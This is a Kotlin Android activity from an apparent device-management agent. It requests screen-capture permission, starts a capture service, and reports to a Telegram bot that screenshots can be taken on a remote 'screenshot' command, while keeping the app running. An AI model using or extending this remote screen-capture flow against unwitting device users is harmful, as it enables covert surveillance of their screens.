package com.mdm.agent.ui

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import com.mdm.agent.MainActivity
import com.mdm.agent.service.ScreenCaptureService
import org.json.JSONObject

/**
 * Activity that requests MediaProjection permission.
 *
 * CRITICAL DESIGN:
 * - Shows system MediaProjection dialog
 * - After user approves/denies, shows a FULL confirmation screen with a "Done" button
 * - User taps "Done" to close → navigates to MainActivity (keeps app alive)
 * - Sends final result to Telegram bot
 *
 * This prevents the app from "exiting" because:
 * 1. The activity stays visible until user taps Done (not auto-finish)
 * 2. On Done, we start MainActivity with NEW_TASK (brings app to foreground)
 * 3. The app process stays alive because MDMService is a foreground service
 */
class ScreenCapturePermissionActivity : Activity() {

    companion object {
        private const val TAG = "ScreenCapturePerm"
        private const val REQUEST_CODE = 7777

        fun requestPermission(context: Context) {
            try {
                val intent = Intent(context, ScreenCapturePermissionActivity::class.java)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                context.startActivity(intent)
                Log.i(TAG, "ScreenCapturePermissionActivity launched")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch permission activity: ${e.message}")
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.i(TAG, "onCreate - requesting MediaProjection")
        // Show a loading screen while the dialog is about to appear
        showLoadingScreen()
        requestMediaProjection()
    }

    private fun showLoadingScreen() {
        try {
            val root = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                setBackgroundColor(Color.WHITE)
                setPadding(64, 96, 64, 96)
            }
            val tv = TextView(this).apply {
                text = "📸\n\nجاري إعداد لقطات الشاشة...\n\nسيظهر طلب الموافقة"
                textSize = 16f
                gravity = Gravity.CENTER
                setTextColor(Color.parseColor("#FF1A1A2E"))
            }
            root.addView(tv)
            setContentView(root)
        } catch (_: Exception) {}
    }

    private fun requestMediaProjection() {
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val intent = mpm.createScreenCaptureIntent()
            @Suppress("DEPRECATION")
            startActivityForResult(intent, REQUEST_CODE)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to request MediaProjection: ${e.message}")
            notifyBot(false, "فشل عرض طلب الموافقة: ${e.message}")
            showResultScreen(false, "فشل عرض طلب الموافقة")
        }
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        Log.i(TAG, "onActivityResult: requestCode=$requestCode resultCode=$resultCode data=${data != null}")

        if (requestCode == REQUEST_CODE && resultCode == Activity.RESULT_OK && data != null) {
            try {
                // Start ScreenCaptureService with the projection data
                val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
                    putExtra("result_code", resultCode)
                    putExtra("result_data", data)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent)
                } else {
                    startService(serviceIntent)
                }
                Log.i(TAG, "✅ MediaProjection granted - ScreenCaptureService started")

                // Wait for the service to initialize, then check + notify
                Handler(Looper.getMainLooper()).postDelayed({
                    val ready = try {
                        ScreenCaptureService.isReady()
                    } catch (e: Exception) {
                        Log.e(TAG, "isReady check failed: ${e.message}")
                        false
                    }
                    if (ready) {
                        notifyBot(true, "✅ تم تفعيل لقطات الشاشة بنجاح. أرسل أمر 'screenshot' لالتقاط صورة.")
                        showResultScreen(true, "تم تفعيل لقطات الشاشة بنجاح")
                    } else {
                        notifyBot(false, "⚠️ تمت الموافقة لكن خدمة لقطات الشاشة لم تبدأ. حاول مرة أخرى.")
                        showResultScreen(false, "لم تبدأ الخدمة بشكل صحيح - حاول مرة أخرى")
                    }
                }, 2000)

            } catch (e: SecurityException) {
                Log.e(TAG, "❌ SecurityException: ${e.message}")
                Toast.makeText(this, "فشل تفعيل لقطات الشاشة", Toast.LENGTH_LONG).show()
                notifyBot(false, "❌ فشل تفعيل لقطات الشاشة: ${e.message}")
                showResultScreen(false, "فشل: ${e.message}")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to start service: ${e.message}", e)
                notifyBot(false, "❌ فشل بدء خدمة لقطات الشاشة: ${e.message}")
                showResultScreen(false, "فشل: ${e.message}")
            }
        } else {
            Log.w(TAG, "MediaProjection permission denied or cancelled")
            notifyBot(false, "❌ تم رفض طلب لقطات الشاشة من قبل المستخدم")
            showResultScreen(false, "تم رفض الطلب")
        }
    }

    /**
     * Show a FULL result screen with a "Done" button.
     * The user must tap "Done" to close - this keeps the activity visible
     * and prevents the app from appearing to "exit" suddenly.
     */
    private fun showResultScreen(success: Boolean, message: String) {
        try {
            val root = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                setBackgroundColor(Color.WHITE)
                setPadding(64, 96, 64, 96)
            }

            val icon = TextView(this).apply {
                text = if (success) "✅" else "❌"
                textSize = 48f
                gravity = Gravity.CENTER
                setPadding(0, 0, 0, 24)
            }
            root.addView(icon)

            val msgView = TextView(this).apply {
                text = message
                textSize = 18f
                setTypeface(typeface, Typeface.BOLD)
                gravity = Gravity.CENTER
                setTextColor(Color.parseColor("#FF1A1A2E"))
                setPadding(0, 0, 0, 16)
            }
            root.addView(msgView)

            val subtitle = TextView(this).apply {
                text = if (success)
                    "يمكنك الآن إغلاق هذه النافذة"
                else
                    "يمكنك المحاولة مرة أخرى لاحقاً"
                textSize = 14f
                gravity = Gravity.CENTER
                setTextColor(Color.parseColor("#FF666666"))
                setPadding(0, 0, 0, 32)
            }
            root.addView(subtitle)

            val btnDone = Button(this).apply {
                text = "تم"
                setTextColor(Color.WHITE)
                textSize = 16f
                setTypeface(typeface, Typeface.BOLD)
                background = android.graphics.drawable.GradientDrawable().apply {
                    setColor(Color.parseColor("#FF128C7E"))
                    cornerRadius = 24f
                }
                setPadding(0, 32, 0, 32)
                val params = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
                layoutParams = params
                setOnClickListener {
                    backToMain()
                }
            }
            root.addView(btnDone)

            setContentView(root)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to show result screen: ${e.message}")
            backToMain()
        }
    }

    /**
     * Navigate to MainActivity and finish.
     * This brings the app to the foreground (instead of exiting to home screen).
     */
    private fun backToMain() {
        try {
            val intent = Intent(this, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to navigate to MainActivity: ${e.message}")
        }
        try { finish() } catch (_: Exception) {}
    }

    /**
     * Send the FINAL response to the Telegram bot.
     */
    private fun notifyBot(success: Boolean, message: String) {
        try {
            val sm = MainActivity.getSocketManager()
            if (sm != null) {
                val response = JSONObject().apply {
                    put("command", "screenshot-on")
                    put("status", if (success) "success" else "error")
                    put("data", message)
                }
                sm.sendCommandResponse(response)
                Log.i(TAG, "📧 Notified bot: success=$success")
            } else {
                Log.w(TAG, "Cannot notify bot - SocketManager is null")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to notify bot: ${e.message}")
        }
    }
}
